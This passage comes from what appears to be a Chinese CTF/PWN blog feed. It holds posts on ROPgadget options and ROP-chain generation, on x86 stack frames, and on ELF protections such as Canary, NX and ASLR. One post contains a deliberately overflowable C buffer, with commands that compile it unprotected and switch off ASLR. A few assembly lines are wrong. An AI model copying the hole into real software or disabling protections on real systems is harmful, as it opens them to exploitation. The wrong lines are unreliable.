class="line">选项翻译：</span><br><span class="line"> </span><br><span class="line">    <span class="literal">-h</span>, <span class="literal">--help</span>：显示帮助信息并退出。</span><br><span class="line">    <span class="literal">-v</span>, <span class="literal">--version</span>：显示版本信息并退出。</span><br><span class="line">    <span class="literal">-c</span>, <span class="literal">--color</span>：输出彩色结果（需要终端支持）。</span><br><span class="line">    <span class="literal">--binary</span> &lt;binary&gt;：指定要分析的二进制文件。</span><br><span class="line">    <span class="literal">--opcode</span> &lt;opcodes&gt;：搜索包含指定指令的 gadgets。</span><br><span class="line">    <span class="literal">--string</span> &lt;string&gt;：搜索包含指定字符串的 gadgets。</span><br><span class="line">    <span class="literal">--memstr</span> &lt;string&gt;：搜索在内存中找到指定字符串的 gadgets。</span><br><span class="line">    <span class="literal">--depth</span> &lt;nbyte&gt;：搜索指定深度的 gadgets。</span><br><span class="line">    <span class="literal">--only</span> &lt;key&gt;：仅显示包含指定关键字的 gadgets。</span><br><span class="line">    <span class="literal">--filter</span> &lt;key&gt;：排除包含指定关键字的 gadgets。</span><br><span class="line">    <span class="literal">--range</span> &lt;<span class="built_in">start-end</span>&gt;：在指定地址范围内搜索 gadgets。</span><br><span class="line">    <span class="literal">--badbytes</span> &lt;byte&gt;：排除包含指定字节的 gadgets。</span><br><span class="line">    <span class="literal">--rawArch</span> &lt;arch&gt;：指定原始架构（例如 x86, amd64, arm 等）。</span><br><span class="line">    <span class="literal">--rawMode</span> &lt;mode&gt;：指定原始模式（例如 <span class="number">32</span> 或 <span class="number">64</span> 位）。</span><br><span class="line">    <span class="literal">--rawEndian</span> &lt;endian&gt;：指定原始字节序（例如 little 或 big）。</span><br><span class="line">    <span class="literal">--re</span> &lt;re&gt;：使用正则表达式搜索 gadgets。</span><br><span class="line">    <span class="literal">--offset</span> &lt;hexaddr&gt;：显示给定偏移地址附近的 gadgets。</span><br><span class="line">    <span class="literal">--ropchain</span>：为找到的 gadgets 生成一个 ROP 链。</span><br><span class="line">    <span class="literal">--thumb</span>：针对 ARM Thumb 指令集搜索 gadgets。</span><br><span class="line">    <span class="literal">--console</span>：将输出发送到控制台（在 <span class="literal">--ropchain</span> 模式下有用）。</span><br><span class="line">    <span class="literal">--norop</span>：不显示 ROP gadgets。</span><br><span class="line">    <span class="literal">--nojop</span>：不显示 JOP gadgets。</span><br><span class="line">    <span class="literal">--callPreceded</span>：仅显示被调用指令前面的 gadgets。</span><br><span class="line">    <span class="literal">--nosys</span>：不显示系统调用 gadgets。</span><br><span class="line">    <span class="literal">--multibr</span>：显示多个分支的 gadgets。</span><br><span class="line">    <span class="literal">--all</span>：显示所有 gadgets，无过滤。</span><br><span class="line">    <span class="literal">--noinstr</span>：不显示指令，只显示偏移。</span><br><span class="line">    <span class="literal">--dump</span>：输出 gadgets 的原始字节。</span><br><span class="line">    <span class="literal">--silent</span>：不显示任何警告或信息。</span><br><span class="line">    <span class="literal">--align</span> ALIGN：对 gadgets 偏移进行对齐。</span><br><span class="line">    <span class="literal">--mipsrop</span> &lt;rtype&gt;：针对 MIPS 架构，指定 ROP 类型（例如 rop, jop, rop_nop）。</span><br><span class="line"> </span><br><span class="line">这些选项可以帮助你根据特定需求定制 ROPgadget 的搜索和分析过程。例如，你可以使用 <span class="literal">--opcode</span> 来搜索包含特定指令序列的 gadgets，或者使用 <span class="literal">--range</span> 来限制搜索的地址范围。你还可以使用 <span class="literal">--ropchain</span> 来自动生成一个基于找到的 gadgets 的 ROP 链，这对于快速构建攻击载荷非常有用。</span><br><span class="line"> </span><br><span class="line">这些例子展示了如何使用ROPgadget的不同选项来执行特定的搜索和分析任务。下面是每个例子及其用途的中文解释：</span><br><span class="line">ROPgadget.py <span class="literal">--binary</span> ./<span class="built_in">test-suite</span><span class="literal">-binaries</span>/elf<span class="literal">-Linux-x86</span></span><br><span class="line">这个命令对指定的x86 Linux ELF二进制文件进行ROP gadgets搜索。</span><br><span class="line"><span class="literal">---------------</span></span><br><span class="line">ROPgadget.py <span class="literal">--binary</span> ./<span class="built_in">test-suite</span><span class="literal">-binaries</span>/elf<span class="literal">-Linux-x86</span> <span class="literal">--ropchain</span></span><br><span class="line">这个命令除了搜索ROP gadgets之外，还自动生成一个ROP链。</span><br><span class="line"> <span class="literal">--------------</span></span><br><span class="line">ROPgadget.py <span class="literal">--binary</span> ./<span class="built_in">test-suite</span><span class="literal">-binaries</span>/elf<span class="literal">-Linux-x86</span> <span class="literal">--depth</span> <span class="number">3</span></span><br><span class="line">这个命令搜索深度为<span class="number">3</span>的ROP gadgets，即只搜索包含<span class="number">3</span>个或更少指令的gadgets。</span><br><span class="line"><span class="literal">---------------</span></span><br><span class="line">ROPgadget.py <span class="literal">--binary</span> ./<span class="built_in">test-suite</span><span class="literal">-binaries</span>/elf<span class="literal">-Linux-x86</span> <span class="literal">--string</span> <span class="string">&quot;main&quot;</span></span><br><span class="line">这个命令搜索包含字符串<span class="string">&quot;main&quot;</span>的ROP gadgets。</span><br><span class="line"><span class="literal">---------------</span></span><br><span class="line">ROPgadget.py <span class="literal">--binary</span> ./<span class="built_in">test-suite</span><span class="literal">-binaries</span>/elf<span class="literal">-Linux-x86</span> <span class="literal">--string</span> <span class="string">&quot;m..n&quot;</span></span><br><span class="line">这个命令使用通配符搜索包含以<span class="string">&quot;m&quot;</span>开头，接着是任意字符，以<span class="string">&quot;n&quot;</span>结尾的字符串的gadgets。</span><br><span class="line"><span class="literal">---------------</span></span><br><span class="line">ROPgadget.py <span class="literal">--binary</span> ./<span class="built_in">test-suite</span><span class="literal">-binaries</span>/elf<span class="literal">-Linux-x86</span> <span class="literal">--opcode</span> c9c3</span><br><span class="line">这个命令搜索包含特定指令序列<span class="number">0</span>xc9（leave）和<span class="number">0</span>xc3（ret）的ROP gadgets。</span><br><span class="line"><span class="literal">---------------</span></span><br><span class="line">ROPgadget.py <span class="literal">--binary</span> ./<span class="built_in">test-suite</span><span class="literal">-binaries</span>/elf<span class="literal">-Linux-x86</span> <span class="literal">--only</span> <span class="string">&quot;mov|ret&quot;</span></span><br><span class="line">这个命令仅搜索包含mov或ret指令的ROP gadgets。</span><br><span class="line"><span class="literal">--------------</span></span><br><span class="line">ROPgadget.py <span class="literal">--binary</span> ./<span class="built_in">test-suite</span><span class="literal">-binaries</span>/elf<span class="literal">-Linux-x86</span> <span class="literal">--only</span> <span class="string">&quot;mov|pop|xor|ret&quot;</span></span><br><span class="line">这个命令仅搜索包含mov、pop、xor或ret指令的ROP gadgets。</span><br><span class="line"><span class="literal">----------------------</span></span><br><span class="line">ROPgadget.py <span class="literal">--binary</span> ./<span class="built_in">test-suite</span><span class="literal">-binaries</span>/elf<span class="literal">-Linux-x86</span> <span class="literal">--filter</span> <span class="string">&quot;xchg|add|sub|cmov.*&quot;</span></span><br><span class="line">这个命令搜索ROP gadgets，但排除包含xchg、add、sub或以cmov开头的指令的gadgets。</span><br><span class="line"><span class="literal">----------------------</span></span><br><span class="line">ROPgadget.py <span class="literal">--binary</span> ./<span class="built_in">test-suite</span><span class="literal">-binaries</span>/elf<span class="literal">-Linux-x86</span> <span class="literal">--norop</span> <span class="literal">--nosys</span></span><br><span class="line">这个命令搜索gadgets，但不显示ROP gadgets和系统调用gadgets。</span><br><span class="line"><span class="literal">--------------------</span></span><br><span class="line">ROPgadget.py <span class="literal">--binary</span> ./<span class="built_in">test-suite</span><span class="literal">-binaries</span>/elf<span class="literal">-Linux-x86</span> <span class="literal">--range</span> <span class="number">0</span>x08041000<span class="literal">-0x08042000</span></span><br><span class="line">这个命令在指定的地址范围内搜索ROP gadgets。</span><br><span class="line"><span class="literal">------------------</span></span><br><span class="line">ROPgadget.py <span class="literal">--binary</span> ./<span class="built_in">test-suite</span><span class="literal">-binaries</span>/elf<span class="literal">-Linux-x86</span> <span class="literal">--string</span> main <span class="literal">--range</span> <span class="number">0</span>x080c9aaa<span class="literal">-0x080c9aba</span></span><br><span class="line">这个命令在指定的地址范围内搜索包含字符串<span class="string">&quot;main&quot;</span>的ROP gadgets。</span><br><span class="line"><span class="literal">--------------------</span></span><br><span class="line">ROPgadget.py <span class="literal">--binary</span> ./<span class="built_in">test-suite</span><span class="literal">-binaries</span>/elf<span class="literal">-Linux-x86</span> <span class="literal">--memstr</span> <span class="string">&quot;/bin/sh&quot;</span></span><br><span class="line">这个命令搜索在内存中能找到字符串<span class="string">&quot;/bin/sh&quot;</span>的ROP gadgets。</span><br><span class="line"><span class="literal">------------------</span></span><br><span class="line">ROPgadget.py <span class="literal">--binary</span> ./<span class="built_in">test-suite</span><span class="literal">-binaries</span>/elf<span class="literal">-Linux-x86</span> <span class="literal">--console</span></span><br><span class="line">这个命令将ROP gadgets的输出发送到控制台，这在某些情况下，如生成ROP链时，可能很有用。</span><br><span class="line"><span class="literal">------------------</span></span><br><span class="line">ROPgadget.py <span class="literal">--binary</span> ./<span class="built_in">test-suite</span><span class="literal">-binaries</span>/elf<span class="literal">-Linux-x86</span> <span class="literal">--badbytes</span> <span class="string">&quot;00|01-1f|7f|42&quot;</span></span><br><span class="line">这个命令搜索ROP gadgets，但排除包含特定字节序列的gadgets，如空字节、控制字符和字节<span class="number">0</span>x42。</span><br><span class="line"><span class="literal">------------------</span></span><br><span class="line">ROPgadget.py <span class="literal">--binary</span> ./<span class="built_in">test-suite</span><span class="literal">-binaries</span>/Linux_lib64.so <span class="literal">--offset</span> <span class="number">0</span>xdeadbeef00000000</span><br><span class="line">这个命令在指定的库文件中搜索偏移`0xdeadbeef00000000</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 解题工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> 解题工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PWN基础-栈帧、C语言函数调用</title>
      <link href="/2025/02/07/PWN%E5%9F%BA%E7%A1%80-%E6%A0%88%E5%B8%A7%E3%80%81C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8/"/>
      <url>/2025/02/07/PWN%E5%9F%BA%E7%A1%80-%E6%A0%88%E5%B8%A7%E3%80%81C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<p>在x86的计算机系统中，内存空间中的栈主要用于<em>保存函数的参数，返回值，返回地址，本地变量</em>等。一切的函数调用都要将不同的数据、地址压入或者弹出栈。因此，为了更好地理解函数的调用，我们需要先来看看栈是怎么工作的。</p><h2 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h2><p>简单来说，栈是一种<strong>LIFO</strong>形式的数据结构，所有的数据都是后进先出。这种形式的数据结构正好满足我们调用函数的方式: 父函数调用子函数，父函数在前，子函数在后；返回时，子函数先返回，父函数后返回。<strong>栈支持两种基本操作，push和pop。push将数据压入栈中，pop将栈中的数据弹出并存储到指定寄存器或者内存中。</strong></p><p>这里是一个push操作的例子。假设我们有一个栈，其中黄色部分是已经写入数据的区域，绿色部分是还未写入数据的区域。现在我们将0x50压入栈中：<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">push $<span class="number">0x50</span> <span class="comment">// 将0x50的压入栈</span></span><br></pre></td></tr></table></figure><br><img src="/2025/02/07/PWN%E5%9F%BA%E7%A1%80-%E6%A0%88%E5%B8%A7%E3%80%81C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8/Pasted image 20250122134025.png" alt="Pasted image 20250122134025"><br>我们再来看看pop操作的例子：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">pop <span class="comment">// 将0x50弹出栈</span></span><br></pre></td></tr></table></figure><p><img src="/2025/02/07/PWN%E5%9F%BA%E7%A1%80-%E6%A0%88%E5%B8%A7%E3%80%81C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8/Pasted image 20250122134109.png" alt="Pasted image 20250122134109"></p><blockquote><p>上面例子中栈的生长方向是从高地址到低地址的，这是因为在下文讲的栈帧中，栈就是向下生长的，因此这里也用这种形式的栈<br>第二，pop操作后，栈中的数据并没有被清空，只是该数据我们无法直接访问。有了这些栈的基本知识，我们现在可以来看看在x86-32bit系统下，C语言函数是如何调用的了。</p><h2 id="栈帧"><a href="#栈帧" class="headerlink" title="栈帧"></a>栈帧</h2><p>栈帧，也就是stack frame，<strong>其本质就是一种栈，只是这种栈专门用于保存函数调用过程中的各种信息（参数，返回地址，本地变量等）。栈帧有栈顶和栈底之分，其中栈顶的地址最低，栈底的地址最高，SP(栈指针)就是一直指向栈顶的</strong>。在x86-32bit中，<em>我们用 <code>ebp</code> 指向栈底，也就是基址指针；用 <code>esp</code> 指向栈顶，也就是栈指针</em>。下面是一个栈帧的示意图：<br><img src="/2025/02/07/PWN%E5%9F%BA%E7%A1%80-%E6%A0%88%E5%B8%A7%E3%80%81C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8/Pasted image 20250122134229.png" alt="Pasted image 20250122134229"><br><strong>一般来说，我们将 <code>ebp</code> 到 <code>esp</code> 之间区域当做栈帧）。<em>并不是整个栈空间只有一个栈帧，每调用一个函数，就会生成一个新的栈帧</em>。在函数调用过程中，我们将调用函数的函数称为“调用者(caller)”，将被调用的函数称为“被调用者(callee)”</strong>。在这个过程中，</p><p>1）“调用者”需要知道在哪里获取“被调用者”返回的值；<br>2）“被调用者”需要知道传入的参数在哪里，<br>3）返回的地址在哪里。同时，我们需要保证在“被调用者”返回后，<code>ebp</code>, <code>esp</code> 等寄存器的值应该和调用前一致。因此，我们需要使用栈来保存这些数据。</p><h2 id="函数调用实例"><a href="#函数调用实例" class="headerlink" title="函数调用实例"></a>函数调用实例</h2><h3 id="函数的调用"><a href="#函数的调用" class="headerlink" title="函数的调用"></a>函数的调用</h3><p>我们直接通过实例来看函数是如何调用的。这是一个有参数但没有调用任何函数的简单函数，我们假设它被其他函数调用。<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">MyFunction</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y, <span class="type">int</span> z)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> a, b, c;</span><br><span class="line">    a = <span class="number">10</span>;</span><br><span class="line">    b = <span class="number">5</span>;</span><br><span class="line">    c = <span class="number">2</span>;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">TestFunction</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> x = <span class="number">1</span>, y = <span class="number">2</span>, z = <span class="number">3</span>;</span><br><span class="line">    MyFunction1(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>对于这个函数，当调用时，<code>MyFunction()</code> 的汇编代码大致如下：<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_MyFunction:</span><br><span class="line">    push ebp            ; <span class="comment">//保存ebp的值</span></span><br><span class="line">    mov  esp, ebp      ; <span class="comment">//将esp的值赋给ebp，使新的ebp指向栈顶</span></span><br><span class="line">sub  esp, <span class="number">0x12</span> ; <span class="comment">//分配额外空间给本地变量</span></span><br><span class="line">    mov  qword ptr [ebp<span class="number">-4</span>], <span class="number">10</span> ; <span class="comment">//对栈中内存进行赋值操作，下同</span></span><br><span class="line">    mov  qword ptr [ebp<span class="number">-8</span>], <span class="number">5</span> ;  </span><br><span class="line">    mov  qword ptr [ebp<span class="number">-12</span>], <span class="number">2</span> ;  </span><br></pre></td></tr></table></figure><br>光看代码可能还是不太明白，我们先来看看此时的栈是什么样的：<br><img src="/2025/02/07/PWN%E5%9F%BA%E7%A1%80-%E6%A0%88%E5%B8%A7%E3%80%81C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8/Pasted image 20250122134529.png" alt="Pasted image 20250122134529">此时调用者做了两件事情：第一，将被调用函数的参数按照从右到左的顺序压入栈中。第二，将返回地址压入栈中。这两件事都是调用者负责的，因此压入的栈应该属于调用者的栈帧。我们再来看看<strong>被调用者</strong>，它也做了两件事情：第一，将老的（调用者的) <code>ebp</code> 压入栈，此时 <code>esp</code> 指向它。第二，将 <code>esp</code> 的值赋给 <code>ebp</code>, <code>ebp</code> 就有了新的值，它也指向存放老 <code>ebp</code> 的栈空间。这时，它成了是函数 <code>MyFunction()</code> 栈帧的栈底。这样，我们就保存了“调用者”函数的 <code>ebp</code>，并且建立了一个新的栈帧。</p></blockquote><p>只要这步弄明白了，下面的操作就好理解了。在 <code>ebp</code> 更新后，我们先分配一块0x12字节的空间用于存放本地变量，这步用 <code>sub</code> 指令实现。。通过使用 <code>mov转移指令</code> 配合 <code>字节数 ptr [offset]</code> 我们便可以给 <code>a</code>, <code>b</code> 和 <code>c</code> 赋值了。<br><img src="/2025/02/07/PWN%E5%9F%BA%E7%A1%80-%E6%A0%88%E5%B8%A7%E3%80%81C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8/Pasted image 20250122134557.png" alt="Pasted image 20250122134557"></p><h3 id="函数的返回"><a href="#函数的返回" class="headerlink" title="函数的返回"></a>函数的返回</h3><p>上面讲的都是函数的调用过程，我们现在来看看函数是如何返回的。从下面这个例子我们可以看出，和调用函数时正好相反。当函数完成自己的任务后，它会将 <code>esp</code> 移到 <code>ebp</code> 处，然后再弹出旧的 <code>ebp</code> 的值到 <code>ebp</code>。这样，<code>ebp</code> 就恢复到了函数调用前的状态了。<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">MyFunction</span><span class="params">( <span class="type">int</span> x, <span class="type">int</span> y, <span class="type">int</span> z )</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> a, <span class="type">int</span> b, <span class="type">int</span> c;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>其汇编大致如下：<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_MyFunction:</span><br><span class="line">    push ebp</span><br><span class="line">    mov esp, ebp</span><br><span class="line">    ...</span><br><span class="line">    mov ebp, esp</span><br><span class="line">    pop ebp</span><br><span class="line">    ret</span><br></pre></td></tr></table></figure><br>我们注意到最后有一个 <code>ret</code> 指令，这个指令相当于 <code>pop + jum</code>。它首先将数据（返回地址）弹出栈并保存到 <code>eip</code> 中，然后处理器根据这个地址无条件地跳到相应位置获取新的指令。<br><img src="/2025/02/07/PWN%E5%9F%BA%E7%A1%80-%E6%A0%88%E5%B8%A7%E3%80%81C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8/Pasted image 20250122134852.png" alt="Pasted image 20250122134852"></p><h2 id="宏观一例"><a href="#宏观一例" class="headerlink" title="宏观一例"></a>宏观一例</h2><p><img src="/2025/02/07/PWN%E5%9F%BA%E7%A1%80-%E6%A0%88%E5%B8%A7%E3%80%81C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8/Pasted image 20250207201642.png" alt="Pasted image 20250207201642"><br><img src="/2025/02/07/PWN%E5%9F%BA%E7%A1%80-%E6%A0%88%E5%B8%A7%E3%80%81C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8/Pasted image 20250207201650.png" alt="Pasted image 20250207201650"><br><img src="/2025/02/07/PWN%E5%9F%BA%E7%A1%80-%E6%A0%88%E5%B8%A7%E3%80%81C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8/Pasted image 20250207185644.png" alt="Pasted image 20250207185644"></p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ELF文件保护机制</title>
      <link href="/2025/02/06/ELF%E6%96%87%E4%BB%B6%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/"/>
      <url>/2025/02/06/ELF%E6%96%87%E4%BB%B6%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/</url>
      
        <content type="html"><![CDATA[<p>Linux ELF文件的保护主要有四种：Canary、NX、PIE、RELRO</p><h2 id="1-Canary"><a href="#1-Canary" class="headerlink" title="1.Canary"></a>1.Canary</h2><p><strong>StackCanary表示栈的报警保护</strong>。<br>在函数返回值之前添加的一串随机数（不超过机器字长）（也叫做cookie），末位为/x00（提供了覆盖最后一字节输出泄露Canary的可能），如果出现缓冲区溢出攻<br>击，覆盖内容覆盖到Canary处，就会改变原本该处的数值，<em>当程序执行到此处时，会检查Canary值是否跟开始的值一样，如果不一样，程序会崩溃，从而达到保护返回地址的目的。</em><br><img src="/2025/02/06/ELF%E6%96%87%E4%BB%B6%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/Pasted image 20250214194346.png" alt="Pasted image 20250214194346"></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//GCC用法</span></span><br><span class="line">gcc -o test test.c <span class="comment">// 默认情况下，不开启Canary保护</span></span><br><span class="line">gcc -fno-<span class="built_in">stack</span>-protector -o test test.c <span class="comment">//禁用栈保护</span></span><br><span class="line">gcc -fstack-protector -o test test.c <span class="comment">//启用堆栈保护，不过只为局部变量中含有 char 数组的函数插入保护代码</span></span><br><span class="line">gcc -fstack-protector-all -o test test.c <span class="comment">//启用堆栈保护，为所有函数插入保护代码</span></span><br><span class="line">-fno-<span class="built_in">stack</span>-protector /-fstack-protector / -fstack-protector-all (关闭 / 开启 / 全开启)</span><br></pre></td></tr></table></figure><h2 id="2-DEP-DataExecutionPrevention-NX-Non-executable-防护"><a href="#2-DEP-DataExecutionPrevention-NX-Non-executable-防护" class="headerlink" title="2.DEP(DataExecutionPrevention)/NX(Non-executable)防护"></a>2.DEP(DataExecutionPrevention)/NX(Non-executable)防护</h2><p>NX即No-eXecute（不可执行）的意思，NX(DEP）的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。<br>正常在栈溢出时通过跳转指令跳转至shellcode，但是NX开启后CPU会对数据区域进行检查，当发现正常程序不执行，并跳转至其他地址后会抛出异常，接下来不会继续执行shellcode，而是去转入异常处理，处理后会禁止shellcode继续执行</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">gcc -o test test.c <span class="comment">// 默认情况下，开启NX保护</span></span><br><span class="line">gcc -z execstack -o test test.c <span class="comment">// 禁用NX保护</span></span><br><span class="line">gcc -z noexecstack -o test test.c <span class="comment">// 开启NX保护</span></span><br><span class="line">-z execstack / -z <span class="title function_">noexecstack</span> <span class="params">(关闭 / 开启)</span></span><br></pre></td></tr></table></figure><h3 id="例"><a href="#例" class="headerlink" title="例"></a>例</h3><p>该防护的作用简单的说就是能写的地方不能执行，能执行的地方不能写。<br>shellcode 所填充的位置是在栈上，但是开启了 DEP 保护后栈上就没有执行的权限也就无法控制程序流程。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">undef</span> _FORTIFY_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">vulnerable_function</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">char</span> buf[<span class="number">128</span>];</span><br><span class="line">read(STDIN_FILENO, buf, <span class="number">256</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv)</span> &#123;</span><br><span class="line">vulnerable_function();</span><br><span class="line">write(STDOUT_FILENO, <span class="string">&quot;Hello, World\n&quot;</span>, <span class="number">13</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不开启 DEP 保护编译：<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gcc -fno-stack-protector -z execstack -o ret2lib ret2lib.c</span><br></pre></td></tr></table></figure><br>查看权限命令：<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /proc/[pid]/maps</span><br></pre></td></tr></table></figure><br>程序运行在后台命令：<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./ret2lib &amp;</span><br></pre></td></tr></table></figure><br>权限如下：<img src="/2025/02/06/ELF%E6%96%87%E4%BB%B6%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/Pasted image 20250125140328.png" alt="Pasted image 20250125140328">开启 DEP 保护编译：<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gcc -fno-stack-protector -o ret2lib ret2lib.c</span><br></pre></td></tr></table></figure><br>权限如下：<br><img src="/2025/02/06/ELF%E6%96%87%E4%BB%B6%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/Pasted image 20250125140357.png" alt="Pasted image 20250125140357"><br>可以看到在开启DEP防护的情况下栈上面就没有执行权限了。</p><h2 id="3-PIE（ASLR）"><a href="#3-PIE（ASLR）" class="headerlink" title="3.PIE（ASLR）"></a>3.PIE（ASLR）</h2><p>一般情况下NX（Windows平台上称为DEP）和地址空间分布随机化（ASLR）会同时工作。内存地址随机化机制有三种情况</p><blockquote><p>0 - 表示关闭进程地址随机化<br>1 - 表示将mmap的基地址，栈基地址和.so地址随机化<br>2 - 表示在1的基础上增加heap的地址随机化</p></blockquote><p><em>该保护能使每次运行的程序的地址都不同，防止根据固定地址来写exp执行攻击</em></p><blockquote><p>可以防止Ret2libc方式针对DEP的攻击。ASLR和DEP配合使用，能有效阻止攻击者在堆栈上运行恶意代码</p></blockquote><p>Linux下关闭PIE的命令：<br><code>sudo -s echo 0 &gt; /proc/sys/kernel/randomize_va_space</code><br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">gcc -o test test.c <span class="comment">// 默认情况下，不开启PIE</span></span><br><span class="line">gcc -fpie -pie -o test test.c <span class="comment">// 开启PIE，此时强度为1</span></span><br><span class="line">gcc -fPIE -pie -o test test.c <span class="comment">// 开启PIE，此时为最高强度2</span></span><br><span class="line">gcc -fpic -o test test.c <span class="comment">// 开启PIC，此时强度为1，不会开启PIE</span></span><br><span class="line">gcc -fPIC -o test test.c <span class="comment">// 开启PIC，此时为最高强度2，不会开启PIE</span></span><br><span class="line">-no-pie / -pie (关闭 / 开启)</span><br></pre></td></tr></table></figure></p><h3 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h3><p>ASLR(Address Space Layout Randomization)在2005年被引入到Linux的内核 kernel 2.6.12 中，当然早在2004年就以patch的形式被引入。<em>随着内存地址的随机化，使得响应的应用变得随机。这意味着同一应用多次执行所使用内存空间完全不同，也意味着简单的缓冲区溢出攻击无法达到目的。</em><br>GDB从版本7开始，第一次在Ubuntu 9.10（Karmic）上，被调试的程序可以被关闭ASLR（通过标记位ADDR_NO_RANDOMIZE ）。</p><blockquote><p>Ubuntu 9.10的版本控制ASLR的方法还不成熟，需要从源码层面确认是否可以关闭开启。</p><h3 id="查看ASLR设置"><a href="#查看ASLR设置" class="headerlink" title="查看ASLR设置"></a>查看ASLR设置</h3><p>查看当前操作系统的ASLR配置情况，两种命令<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cat</span> /proc/sys/kernel/randomize_va_space</span></span><br><span class="line">2</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sysctl -a --pattern randomize</span></span><br><span class="line">kernel.randomize_va_space = 2</span><br></pre></td></tr></table></figure></p><h3 id="配置选项"><a href="#配置选项" class="headerlink" title="配置选项"></a>配置选项</h3><ul><li>0 = 关闭</li><li>1 = 半随机。共享库、栈、mmap() 以及 VDSO 将被随机化。（留坑，PIE会影响heap的随机化。。）</li><li>2 = 全随机。除了1中所述，还有heap。<br>后面会详细介绍ASLR的组成，不关心的同学可以简单理解为ASLR不是一个笼统的概念，而是要按模块单独实现的。当然，在攻防对抗的角度上，应为不是所有组件都会随机，所以我们就可以按图索骥，写出通用的shellcode调用系统库。<h3 id="查看地址空间随机效果"><a href="#查看地址空间随机效果" class="headerlink" title="查看地址空间随机效果"></a>查看地址空间随机效果</h3>使用ldd命令就可以观察到程序所依赖动态加载模块的地址空间，如下下图所示，被括号包裹。在shell中，运行两次相同的ldd命令，即可对比出前后地址的不同之处，当然，ASLR开启时才会变化：<br><img src="/2025/02/06/ELF%E6%96%87%E4%BB%B6%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/Pasted image 20250121141533.png" alt="Pasted image 20250121141533"><br><strong>ASLR开启时，动态库的加载地址不同</strong></li></ul></blockquote><p><img src="/2025/02/06/ELF%E6%96%87%E4%BB%B6%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/Pasted image 20250121141548.png" alt="Pasted image 20250121141548"><br><strong>ASLR关闭时，动态库的加载地址相同</strong></p><h4 id="关闭ASLR"><a href="#关闭ASLR" class="headerlink" title="关闭ASLR"></a>关闭ASLR</h4><h5 id="方法一：-手动修改randomize-va-space文件"><a href="#方法一：-手动修改randomize-va-space文件" 